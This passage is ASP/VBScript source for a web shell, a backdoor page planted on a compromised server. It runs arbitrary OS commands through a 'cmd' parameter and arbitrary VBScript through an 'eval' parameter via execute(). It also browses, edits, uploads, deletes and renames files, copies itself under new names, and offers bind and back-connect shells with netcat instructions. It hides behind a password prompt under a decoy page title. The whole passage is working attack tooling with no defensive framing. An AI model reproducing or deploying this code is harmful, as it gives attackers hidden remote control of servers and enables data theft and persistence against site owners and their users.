xCwd = xcleanpath(xCwd)
If(Request.QueryString("cmd") <> "") Then
	Dim cmd,pos,newdir
	cmd = Trim(Request.QueryString("cmd"))
	pos = InStr(LCase(cmd),"cd ")
	If pos = 1 Then
		newdir = Trim(Mid(cmd,3))
		if(newdir = "\") Then
			xCwd = Mid(xCwd,1,3)
		Else
			If(InStr(newdir,":") > 0) Then
				if(is_dir(newdir)) Then
					xCwd = xcleanpath(newdir)
					Set CurPath = CreateObject("Scripting.FileSystemObject")
					xCwd = xcleanpath(CurPath.GetAbsolutePathName(xcwd))
					Set CurPath = nothing
				End If
			Else
				If(is_dir(xCwd & newdir)) Then
					xCwd = xcleanpath(xCwd & newdir)
					Set CurPath = CreateObject("Scripting.FileSystemObject")
					xCwd = xcleanpath(CurPath.GetAbsolutePathName(xcwd))
					Set CurPath = nothing
				End If
			End If
		End If
		result = xdir(xCwd)
	ElseIf((Len(cmd) <= 3) And (InStr(cmd,":") > 0)) Then
		If(is_dir(cmd)) Then
			xCwd = UCase(Mid(cmd,1,1)) & ":\"
		End If
		result = xdir(xCwd)
	Else
		result = ekse(cmd)
		if(result = "") Then
			result = xdir(xCwd)
		Else
			result = Replace(htmlspecialchars(result), " ", "&nbsp;")
			result = nl2br(result)
		End If
	End If
ElseIf(Request.QueryString("eval") <> "") Then
	Response.ContentType = "text/html"
	sblm = Mid(Request.QueryString,5,InStr(Request.QueryString,"eval") - 6)
	Response.Write "<form action=""?"" method=""get"">"
	Response.Write "<input type=""hidden"" name=""dir"" value=""" & sblm & """ />"
	Response.Write "<input style=""width:60%;"" type=""text"" name=""eval"" value="""" />"
	Response.Write "<input type=""submit"" name=""btnEval"" value=""Eval"" /></form>"
	Response.Write execute(Request.QueryString("eval"))
	Response.End
ElseIf(Request.QueryString("properties") <> "") Then
	fname = xcleanpath(Request.QueryString("properties"))
	If(Request.QueryString("oldfilename") <> "") Then
		oldname = Request.QueryString("oldfilename")
		Set fs = Server.CreateObject("Scripting.FileSystemObject")
		If(is_file(oldname)) Then
			Set f = fs.GetFile(oldname)
		Elseif(is_dir(oldname)) Then
			Set f = fs.GetFolder(oldname)
		End If
		f.Move(fname)
		set f = nothing
		set fs = nothing
	End If
	dir = Request.QueryString("dir")
	fcont = ""
	fview = ""
	If(is_dir(fname)) Then
		fsize = "DIR"
		fname = Mid(fname,1,Len(fname)-1)
		fcont = xdir(fname)
		faction = "<a href=""?dir=" & xcleanpath(fname) & "&properties=" & xcleanpath(fname) & """>Properties</a> | <a href=""?dir=" & xcleanpath(xparentfolder(fname)) & "&del=" & xcleanpath(fname) & """>Remove</a>"
		Set fs = Server.CreateObject("Scripting.FileSystemObject")
		Set f = fs.GetFolder(fname)
		filectime = xdateformat(f.DateCreated)
		fileatime = xdateformat(f.DateLastAccessed)
		filemtime = xdateformat(f.DateLastModified)
		set f=nothing
		set fs=nothing
	Else
		fname = Mid(fname,1,Len(fname)-1)
		fsize = xparsefilesize(xfilesize(fname)) & " <span class=""gaul"">( </span>" & xfilesize(fname) & " bytes<span class=""gaul""> )</span>"
		xtype = ""
		If(Request.QueryString("type") <> "") Then
			xtype = Request.QueryString("type")
		Else
			Set fs = Server.CreateObject("Scripting.FileSystemObject")
			Set f = fs.GetFile(fname)
			contype = LCase(f.Type)
			If(InStr(contype,"image")) Then
				xtype = "img"
			Else
				xtype = "text"
			End If
		End If
		If(xtype = "text") Then
			code = htmlspecialchars(xfileopen(fname,false))
			fcont = "<div class=""boxcode"">" & nl2br(code) & "</div>"
		Elseif(xtype = "img") Then
			imglink = "<p><a href=""?img=" & fname & """ target=""_blank""><span class=""gaul"">[ </span>view full size<span class=""gaul""> ]</span></a></p>"
			fcont = "<div style=""text-align:center;width:100%;"">" & imglink & "<img width=""800"" src=""?img=" & fname & """ alt="""" style=""margin:8px auto;padding:0;border:0;"" /></div>"
		Else
			fcont = ""
		End If
		Set fs = Server.CreateObject("Scripting.FileSystemObject")
		Set f = fs.GetFile(fname)
		filectime = xdateformat(f.DateCreated)
		fileatime = xdateformat(f.DateLastAccessed)
		filemtime = xdateformat(f.DateLastModified)
		set f=nothing
		set fs=nothing
		faction = "<a href=""?dir=" & xcleanpath(dir) & "&view=" & fname & """>Edit</a> | <a href=""?get=" & fname & """>Download</a> | <a href=""?dir=" & xcleanpath(dir) & "&del=" & fname & """>Remove</a>"
		fview = "<a href=""?dir=" & xcleanpath(dir) & "&properties=" & fname & "&type=text""><span class=""gaul"">[ </span>text<span class=""gaul""> ]</span></a><a href=""?dir=" & xcleanpath(dir) & "&properties=" & fname & "&type=img""><span class=""gaul"">[ </span>image<span class=""gaul""> ]</span></a>"
	End If
	fowner = xfileowner(fname)
	fperm = xfileperms(fname)
	result = "<div style=""display:inline;"">" &_
	"<form action=""?"" method=""get"" style=""margin:0;padding:1px 8px;text-align:left;"">" &_
	"<input type=""hidden"" name=""dir"" value=""" & dir & """ />" &_
	"<input type=""hidden"" name=""oldfilename"" value=""" & fname & """ />" & faction & " |&nbsp;" &_
	"<span><input style=""width:50%;"" type=""text"" name=""properties"" value=""" & fname & """ />&nbsp;" &_
	"<input style=""width:120px"" class=""btn"" type=""submit"" name=""btnRename"" value=""Rename"" />" &_
	"</span>" &_
	"<div class=""fprop"">" &_
	"Size = " & fsize & "<br />" &_
	"Owner = <span class=""gaul"">( </span>" & fowner & "<span class=""gaul""> )</span><br />" &_
	"Permission = <span class=""gaul"">( </span>" & fperm & "<span class=""gaul""> )</span><br />" &_
	"Create Time = <span class=""gaul"">( </span>" & filectime & "<span class=""gaul""> )</span><br />" &_
	"Last Modified = <span class=""gaul"">( </span>" & filemtime & "<span class=""gaul""> )</span><br />" &_
	"Last Accessed = <span class=""gaul"">( </span>" & fileatime & "<span class=""gaul""> )</span><br />" &_
	fview &_
	"</div>" & fcont &_
	"</form>" &_
	"</div>"
ElseIf((Request.QueryString("view") <> "") Or (Request.QueryString("filename") <> "")) Then
	msg = ""
	If(Request.Form("save") = "Save As") Then
		file = Trim(Request.Form("saveas"))
		content = Request.Form("filesource")
		If(xfilesave(file,content)) Then
			pesan = "File Saved"
		Else
			pesan = "Failed to save file"
		End If
		msg = "<span style=""float:right;""><span class=""gaul"">[ </span>" & pesan & "<span class=""gaul""> ]</span></span>"
	Else
		If(Request.QueryString("view") <> "") Then
			file = Trim(Request.QueryString("view"))
		Else
			file = xCwd & Trim(Request.QueryString("filename"))
		End If
	End If
	result = xfileopen(file,false)
	result = htmlspecialchars(result)
	result = "<p style=""padding:0;margin:0;text-align:left;""><a href=""?dir=" & xCwd & "&properties=" & file & """>" & xfilesummary(file) & "</a>" & msg & "</p><div style=""clear:both;margin:0;padding:0;""></div>" &_
	"<form action=""?dir=" & xCwd & "&view=" & file & """ method=""post"">" &_
	"<textarea name=""filesource"" style=""width:100%;height:200px;"">" & result & "</textarea>" &_
	"<input type=""text"" style=""width:80%;""  name=""saveAs"" value=""" & file & """ />&nbsp;" &_
	"<input type=""submit"" class=""btn"" style=""width:120px;"" name=""save"" value=""Save As"" /></form>"
Else
	result = xdir(xCwd)
End If
'//################# Finalizing #######################======================================================]
If(auth) Then
	If(Request.QueryString("bportC") <> "") Then
		bportC = Request.QueryString("bportC")
	Else
		bportC = shell_fav_port
	End If
	If(Request.QueryString("lportC") <> "") Then
		lportC = Request.QueryString("lportC")
	Else
		lportC = shell_fav_port
	End If
	html_title = shell_title & " " & xCwd
	html_head = "" &_
"<title>" & html_title & "</title>" &_
"<link rel=""SHORTCUT ICON"" href=""" & Request.ServerVariables("SCRIPT_NAME") & "?img=icon"" />" &_
"" & shell_style & "" &_
"<script type=""text/javascript"">" &_
"function updateInfo(boxid,typ){" &_
"	if(typ == 0){" &_
"		var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';	" &_
"	}" &_
"	else{" &_
"		var pola = 'example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " & xServerIP & " __PORT__&quot;';	" &_
"	}" &_
"" &_
"	var portnum = document.getElementById(boxid).value;" &_
"" &_
"	var hasil = pola.replace('__PORT__', portnum);" &_
"	document.getElementById(boxid+'_').innerHTML = hasil;" &_
"}" &_
"" &_
"function show(boxid){" &_
"	var box = document.getElementById(boxid);" &_
"	if(box.style.display != 'inline'){" &_
"		document.getElementById('newfile').style.display = 'none';" &_
"		document.getElementById('newfolder').style.display = 'none';" &_
"		document.getElementById('newupload').style.display = 'none';" &_
"		document.getElementById('newchild').style.display = 'none';" &_
"		document.getElementById('newconnect').style.display = 'none';" &_
"		document.getElementById('div_eval').style.display = 'none';" &_
"" &_
"		box.style.display = 'inline';" &_
"		box.focus();" &_
"	}" &_
"	else box.style.display = 'none';" &_
"}" &_
"" &_
"function highlighthexdump(address){" &_
"	var target = document.getElementById(address);" &_
"	target.style.background = '" & shell_color & "';" &_
"}" &_
"function unhighlighthexdump(address){" &_
"	var target = document.getElementById(address);" &_
"	target.style.background = 'none';" &_
"}" &_
"</script>"
html_body = "" &_
"<div id=""wrapper"">" &_
"<h1 onmouseover=""this.style.cursor='pointer';this.style.cursor='hand';""  onclick=""window.location= '?';""><a href=""?"">" & shell_title & "</a></h1>" &_
"<div class=""box"">" & xHeader & "" &_
"<div class=""fpath"">" &_
xdrive() & xparsedir(xCwd) &_
"</div>" &_
"" &_
"<div class=""menu"">" &_
"<a href=""javascript:show('newfile');""><span class=""gaul"">[ </span> New File<span class=""gaul""> ]</span></a>&nbsp;" &_
"<a href=""javascript:show('newfolder');""><span class=""gaul"">[ </span>New Folder<span class=""gaul""> ]</span></a>&nbsp;" &_
"<a href=""javascript:show('newchild');""><span class=""gaul"">[ </span>Replicate<span class=""gaul""> ]</span></a>&nbsp;" &_
"<a href=""javascript:show('newupload');""><span class=""gaul"">[ </span>Upload<span class=""gaul""> ]</span></a>&nbsp;" &_
"<a href=""javascript:show('newconnect');""><span class=""gaul"">[ </span>BindShell<span class=""gaul""> ]</span></a>&nbsp;" &_
"<a href=""javascript:show('div_eval');""><span class=""gaul"">[ </span>VBs Eval<span class=""gaul""> ]</span></a>&nbsp;" &_
"</div>" &_
"" &_
"<div class=""hidden"" id=""newconnect"">" &_
"<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" &_
"<table class=""tblBox"" style=""width:100%;"">" &_
"<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" &_
"<tr><td style=""width:130px;"">BackConnect</td><td style=""width:200px;"">" &_
"Port&nbsp;<input maxlength=""5"" id=""backC"" onkeyup=""updateInfo('backC',0);"" style=""width:60px;"" type=""text"" name=""bportC"" value=""" & bportC & """ />" &_
"&nbsp;<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnConnect"" value=""Connect"" />" &_
"</td>" &_
"<td><span id=""backC_"" class=""msgcon"">example: (using netcat) run &quot;nc -l -p " & bportC & "&quot; and then press Connect</span></td>" &_
"</tr>" &_
"" &_
"<tr><td>Listen</td><td>" &_
"Port&nbsp;<input maxlength=""5"" id=""listenC"" onkeyup=""updateInfo('listenC',1);"" style=""width:60px;"" type=""text"" name=""lportC"" value=""" & lportC & """ />" &_
"&nbsp;<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnListen"" value=""Listen"" />" &_
"</td>" &_
"<td><span id=""listenC_"" class=""msgcon"">example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " & xServerIP & " " & lportC & "&quot;</span></td>" &_
"</tr>" &_
"</table>" &_
"</form>" &_
"</div>" &_
"" &_
"<div class=""hidden"" id=""newfolder"">" &_
"<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" &_
"<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" &_
"<table class=""tblBox"" style=""width:560px;"">" &_
"<tr><td style=""width:120px;"">New Foldername</td><td style=""width:304px;"">" &_
"<input style=""width:300px;"" type=""text"" name=""foldername"" value=""newfolder"" />" &_
"</td><td>" &_
"<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewfolder"" value=""Create"" />" &_
"</td></tr>" &_
"</table>" &_
"</form>" &_
"</div>" &_
"" &_
"<div class=""hidden"" id=""newfile"">" &_
"<form action=""?"" method=""get"" style=""display:inline;margin:0;padding:0;"">" &_
"<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" &_
"<table class=""tblBox"" style=""width:560px;"">" &_
"<tr><td style=""width:120px;"">New Filename</td><td style=""width:304px;"">" &_
"<input style=""width:300px;"" type=""text"" name=""filename"" value=""newfile"" />" &_
"</td><td>" &_
"<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewfile"" value=""Create"" />" &_
"</td></tr>" &_
"</form>" &_
"</table>" &_
"</div>" &_
"" &_
"<div class=""hidden"" id=""newupload"">" &_
"<form method=""post"" action=""?dir=" & xCwd & "&upload=y"" enctype=""multipart/form-data"" style=""display:inline;margin:0;padding:0;"">" &_
"<table class=""tblBox"" style=""width:560px;"">" &_
"<tr><td style=""width:120px;"">Save as</td><td><input style=""width:300px;"" type=""text"" name=""filename"" value="""" /></td></tr>" &_
"<tr><td style=""width:120px;"">From Url</td><td style=""width:304px;"">" &_
"<input style=""width:300px;"" type=""text"" name=""fileurl"" value="""" />" &_
"</td><td><input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewUploadUrl"" value=""Get"" /></td></tr>" &_
"<tr><td style=""width:120px;"">From Computer</td><td style=""width:304px;"">" &_
"<input style=""width:300px;"" type=""file"" name=""filelocal"" />" &_
"</td><td>" &_
"<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewUploadLocal"" value=""Get"" />" &_
"</td></tr>" &_
"</table>" &_
"</form>" &_
"</div>" &_
"" &_
"<div class=""hidden"" id=""newchild"">" &_
"<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" &_
"<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" &_
"<table class=""tblBox"" style=""width:560px;"">" &_
"<tr><td style=""width:120px;"">New Shellname</td><td style=""width:304px;"">" &_
"<input style=""width:300px;"" type=""text"" name=""childname"" value=""" & shell_name & ".asp""; />" &_
"</td><td><input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewchild"" value=""Create"" />" &_
"</td></tr>" &_
"</table>" &_
"</form>" &_
"</div>" &_
"" &_
"<div class=""hidden"" id=""div_eval"">" &_
"<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" &_
"<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" &_
"<table class=""tblBox"" style=""width:560px;"">" &_
"<tr><td>" &_
"<textarea name=""eval"" style=""width:100%;height:100px;""></textarea>" &_
"</td></tr><tr>" &_
"<td style=""text-align:right;""><input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnEval"" value=""Eval"" /></td></tr>" &_
"</table>" &_
"</form>" &_
"</div>" &_
"" &_
"<div class=""bottomwrapper"">" &_
"<div class=""cmdbox"">" &_
"<form action=""?"" method=""get"">" &_
"<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" &_
"<table style=""width:100%;""><tr>" &_
"<td style=""width:88%;""><input type=""text"" id=""cmd"" name=""cmd"" value="""" style=""width:100%;"" /></td>" &_
"<td style=""width:10%;""><input type=""submit"" class=""btn"" name=""btnCommand"" style=""width:120px;"" value=""Execute"" /></td></tr></table>" &_
"</form>" &_
"</div>" &_
"" &_
"<div class=""result"" id=""result"">" &_
"" & result & "" &_
"</div></div></div></div>"
Else
	html_title = shell_fake_name
	html_head = "<title>" & html_title & "</title>" & shell_style
	html_body = "" &_
"<div style=""margin:30px;"">" &_
"<div>" &_
"<form action=""?"" method=""post"">" &_
"<input id=""cmd"" type=""text"" name=""passw"" value="""" />" &_
"&nbsp;<input type=""submit"" name=""btnpasswd"" value=""Ok"" />" &_
"</form>" &_
"</div>" &_
"<div style=""font-size:10px;"">" & shell_fake_name & "</div>" &_
"</div>"
End If
If Not Uploaded Then
	If((Request.QueryString("cmd") <> "") Or (Request.Form("passw") <> "")) Then
		html_onload = "onload=""document.getElementById('cmd').focus();"""
	Else
		html_onload = ""
	End If
End If
html_final = "" &_
"<html>" &_
"<head>" &_
"" & html_head & "" &_
"</head>" &_
"<body " & html_onload & ">" &_
"<div id=""mainwrapper"">" &_
"" & html_body & "" &_
"</div>" &_
"</body>" &_
"</html>"
Response.BinaryWrite(html_final)
%>